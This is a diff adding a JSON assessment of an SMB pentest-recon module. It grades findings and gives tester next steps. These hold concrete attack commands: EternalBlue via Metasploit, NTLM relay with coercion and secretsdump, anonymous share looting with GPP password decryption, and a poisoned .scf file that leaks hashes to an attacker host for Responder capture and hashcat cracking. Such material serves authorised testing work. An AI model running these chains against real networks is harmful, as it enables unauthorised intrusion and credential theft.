@@ -1,0 +1,92 @@
+{
+  "service": "smb",
+  "summary": "SMB module is credential-free + credentialed hybrid: stdlib SMB2/SMB1 NEGOTIATE probe fingerprints dialect and signing posture (T1 safe verify), pulls NTLM CHALLENGE for pre-auth info disclosure (T1), and enumerates via nxc/smbclient. Writable share detection actually PROVES write with a reversible drop-list-delete (T2). No secretsdump/relay execution here (per user directive - T3 stays as tester_next_step). Biggest gap: it never runs the actual MS17-010 vuln check itself (only points to nmap), and it never harvests LAPS/GPP passwords from spidered shares.",
+  "module_files": [
+    "recce/services/smb.py"
+  ],
+  "findings": [
+    {
+      "kind": "smbv1",
+      "title_pattern": "SMBv1 (legacy protocol) enabled - EternalBlue/MS17-010 surface",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "SMBv1 NEGOTIATE returned a selected dialect - direct wire observation that legacy proto is enabled, but does NOT prove MS17-010 exploitability.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Add an inline SMB_COM_TRANSACTION2 SECONDARY probe (the ms17-010 nse check) that reads STATUS_INSUFF_SERVER_RESOURCES vs STATUS_INVALID_HANDLE to distinguish patched vs vulnerable. Non-destructive, mirrors nmap smb-vuln-ms17-010.",
+      "promotion_risk": "low",
+      "tester_next_step": "nmap --script smb-vuln-ms17-010 -p445 <ip>. If VULNERABLE: msf use exploit/windows/smb/ms17_010_eternalblue set RHOSTS <ip>; LHOST <you>; check first, exploit only in ROE.",
+      "related_cves": [
+        "CVE-2017-0143",
+        "CVE-2017-0144",
+        "CVE-2017-0145",
+        "CVE-2017-0146",
+        "CVE-2017-0148"
+      ]
+    },
+    {
+      "kind": "smb_signing_not_required",
+      "title_pattern": "SMB signing not required (NTLM relay target)",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "SecurityMode SIGN_REQUIRED bit read directly from an SMB2 NEGOTIATE reply - deterministic proof this host is a viable NTLM relay target.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Chain a coercion source from msrpc (PetitPotam/PrinterBug/DFSCoerce) + ntlmrelayx -t smb://<ip> -smb2support --socks. recce would need known_relay_targets shared surface consumed by msrpc's coercion finding to auto-suggest the full chain.",
+      "promotion_risk": "high",
+      "tester_next_step": "impacket-ntlmrelayx.py -t smb://<ip> -smb2support -socks & then Coercer coerce -u <lowpriv> -p <pass> -t <victim-dc> -l <your-ip>. On success socks proxies psexec/secretsdump through the relay.",
+      "related_cves": [
+        "CVE-2017-8563"
+      ]
+    },
+    {
+      "kind": "smb_ntlm_info_disclosure",
+      "title_pattern": "SMB pre-auth NTLM CHALLENGE leaks host/domain intel",
+      "severity": "low",
+      "tier": "t1",
+      "tier_evidence": "One extra NEGOTIATE+SESSION_SETUP round trip parses NTLMSSP CHALLENGE AV_PAIRs - pre-auth harvest of NetBIOS/DNS/AD domain/forest/OS build/server clock, deterministic and non-destructive.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Already at its ceiling - info leak is its purpose. Value lives in feeding known_hostnames/known_domains/kerberos_skew across modules; make sure kerberos.kdc_probe/skew and ldap kerberos_realm both consume this.",
+      "promotion_risk": "none",
+      "tester_next_step": "nxc smb <ip> - the banner prints the same fields; then feed dns_domain into kerberos, and os_version into a CVE map (searchsploit windows <build>)."
+    },
+    {
+      "kind": "null_session",
+      "title_pattern": "SMB null / anonymous session allows enumeration",
+      "severity": "medium",
+      "tier": "t2",
+      "tier_evidence": "nxc actually authenticated with empty creds and enumerated shares+users - the null session was USED, not just probed. Confirmed anonymous logon with data returned.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Add spider_shares invocation on the enumerated share list to pull actual sensitive files (GPP cpassword, unattend.xml). flag_secret_files already exists and is unit-testable - wire it into cmd_smb so a null-session run auto-hunts secrets.",
+      "promotion_risk": "medium",
+      "tester_next_step": "enum4linux-ng -A <ip>; then rpcclient -U '' -N <ip> and run: lsaenumsid, lookupnames, samrdump. For GPP: nxc smb <ip> -u '' -p '' -M gpp_password."
+    },
+    {
+      "kind": "readable_share",
+      "title_pattern": "SMB share readable without credentials",
+      "severity": "medium",
+      "tier": "t2",
+      "tier_evidence": "nxc reports READ ACL on non-admin shares that anonymous can actually reach - the read capability is confirmed by the enum session, not inferred.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Auto-run spider_shares on each anon-readable share (already implemented) and emit the 'Sensitive files readable' finding as part of the default anonymous flow, not a manual follow-up. Would land actual credentials (GPP, unattend, .kdbx, id_rsa).",
+      "promotion_risk": "low",
+      "tester_next_step": "smbclient //<ip>/<share> -N -c 'recurse; ls'; then smbget -R smb://<ip>/<share>. Grep for password, cpassword, connectionstring. gpp-decrypt any cpassword=... hits."
+    },
+    {
+      "kind": "writable_share",
+      "title_pattern": "Writable SMB share (proven)",
+      "severity": "high",
+      "tier": "t2",
+      "tier_evidence": "prove_writable actually puts a marker file, lists it, and deletes it - the write is proven with a controlled payload (reversible canary). This IS proof-of-exploit for the write primitive.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Would need to drop a poisoned .scf/.url and stand up a Responder listener to capture NetNTLM from any browser hit. Not appropriate for automatic execution - stays as tester_next_step per user directive.",
+      "promotion_risk": "high",
+      "tester_next_step": "smbclient //<ip>/<share> -N -c 'put @poisoned.scf; ls'. Content: [Shell]\\nCommand=2\\nIconFile=\\\\<your-ip>\\pwn.ico\\n[Taskbar]\\nCommand=ToggleDesktop. Then responder -I <iface> -A. Capture the NetNTLMv2 -> hashcat -m 5600 -> reuse or relay.",
+      "related_cves": []
+    }
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_hostnames",
+    "known_domains",
+    "known_users (feed to kerberoast)",
+    "known_relay_targets (produce - consumed by msrpc coercion + adcs relay)"
+  ]
+}
